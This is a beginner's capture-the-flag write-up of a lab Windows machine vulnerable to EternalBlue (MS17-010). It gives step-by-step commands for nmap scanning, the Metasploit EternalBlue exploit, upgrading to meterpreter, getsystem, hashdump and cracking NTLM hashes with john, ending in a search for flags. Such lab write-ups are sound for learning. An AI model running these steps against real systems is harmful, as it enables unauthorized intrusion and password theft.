# Eternal Blue
> Author: daniboomberger
> Date: 12.10.2020

## What is Eternal Blue?
> Eternal Blue is Vulnerability could lead to allowing the attacker to do a remote code execution. The attacker would send a sepcially crafted message to SMBv1 Server. SMB stands for Server Message Block, which is a communication protocol for providing shared access to files, printer and serial ports between nodes on a network. The Vulnerability was foud by the NSA (National Security Agency).
(Information Resources: Microsoft: https://docs.microsoft.com/en-us/security-updates/SecurityBulletins/2017/ms17-010
                        Wikipedia: https://en.wikipedia.org/wiki/Server_Message_Block)

## Recon

> **Scan the machine.**
> - `nmap -sC -sV <IP_ADDRESS>`
> - `-sC` does mean the same as `--script=default`
> - `-sV` Probe open ports to determine service/version info
> - you will get a output file (nmap.txt), which can be read
>
> **How many ports are open with a port number under 1000?**
> - `nmap -p0-1000 <IP_ADDRESS>`
> - `p` specify port (or port range)
> - The output of nmap was three ports are open under this range
>
> **What is this machine vulnerable to?**
> - `nmap --script vuln <IP_ADDRESS>`
> - It scans the host for vulnerabilities
> - It will show the information of a vulnerability called `ms17-010` the so called eternal blue exploit
> - INFO: I ran these specific nmap commands to have some sort of training (nmap training)...

## Gain Access

> **Start Metasploit**
> - `msfconsole -q`
> - `-q` this prevents the banner to appear
> - Will open metasploit
>
> **Find the exploitation code we will run against the machine**
> - `search ms17-010`
> - This will let you search the exploit in metasploit (search term we got from nmap vuln scan)
> - There will appear some exploits after the search term the correct one will be
> - `exploit/windows/smb/ms17_010_eternalblue` this is the one we are looking for
> - `use exploit/windows/smb/ms17_010_eternalblue`
> - That is to use the exploit that we've searched
> - You could also read the id in the search and run `use <ID>`
>
> **Show options and set the one required value. What is the name of this value?**
> - `show options`
> - It will show a list of options and if they are required and also show there value.
> - You have to search the option that is required, but has no value set `RHOSTS`
> - `set RHOSTS <IP_ADDRESS>`
> - This will set `RHOSTS` to the IP Address of our target
> 
> **Run the exploit**
> - `run` or `exploit`
> - One of these two commands will run the exploit (ms17-010)
> - After it's successfully finished there will appear a DOS Shell
> - If everything is the same you have to put the shell in the background `CTRL+Z`

## Escalate

> **Research online how to convert a shell to meterpreter shell in metasploit. Post Module Name?**
> - I searched with the term `shell to meterpreter` (I know big brain me)
> - So I found this path in the World Wide Web `post/multi/manage/shell_to_meterpreter`
> - And No I don't go back and provide the link, because I wrote this writeup after I finished the Room
> 
> **Select this (use MODULE_PATH). Show options, what option are we required to change?**
> - `show options`
> - This will provide us a options list with all options
> - Search the required field that has no Value in it `SESSION`
>
> **Set the required option, you may need to list all of the sessions to find your target here.**
> - `sessions`
> - That command shows us a list of all current sessions
> - `set SESSION <ID>`
> - Set the <ID> to ID of the Windows shell (ID will probably be 1)
> 
> **Run! If this doesn't work, try completing the exploit from the previous task once more.**
> - `run` or `exploit`
> - Will run this `post/multi/manage/shell_to_meterpreter`
> - `getsystem`
> - If you run this command your return should be `NT AUTHORITY\SYSTEM`
> - `shell`
> - This command would open the DOS shell and in this shell you could run the command `whoami` to check
> 
> **List all of the processes running via the 'ps' command. Just because we are system doesn't mean our process is. Find a process towards the bottom of this list that is running at NT AUTHORITY\SYSTEM and write down the process id (far left column)**
>
> **Migrate to this process using the 'migrate PROCESS_ID' command where the process id is the one you just wrote down in the previous step. This may take several attempts, migrating processes is not very stable. If this fails, you may need to re-run the conversion process or reboot the machine and start once again. If this happens, try a different process next time**

## Cracking

> **Within our elevated meterpreter shell, run the command 'hashdump'. This will dump all of the passwords on the machine as long as we have the correct privileges to do so. What is the name of the non-default user?**
> - `hashdump`
> - Command will provide you with users and there password hashes
> - Three Users will appear (Administrator, Guest and Jon) `Jon` it is
> 
> **Copy this password hash to a file and research how to crack it. What is the cracked password?**
> - `john --format=NT --wordlist=/usr/share/wordlists/rockyou.txt password.txt`
> - Windows stores hashes in NTLM so thats why we use `--format=NT`
> - The `--wordlist=/usr/share/wordlists/rockyou.txt` is to provide rockyou.txt (your path could be different)
> - And password.txt is a created file by with the hashed password inside

## Find flags!
> **Search the flags in the Windows System**
> - `search -f flag*.txt`
> - A magic command from meterpreter that will provide you with all three flags and there path

## Conclusion
> I really liked the box and it was fun to work around with metasploit. I'm actually a beginner and did not start long ago and it was totally good explained. As a tip, always try to understand what you are doing and not only copy paste the commands.
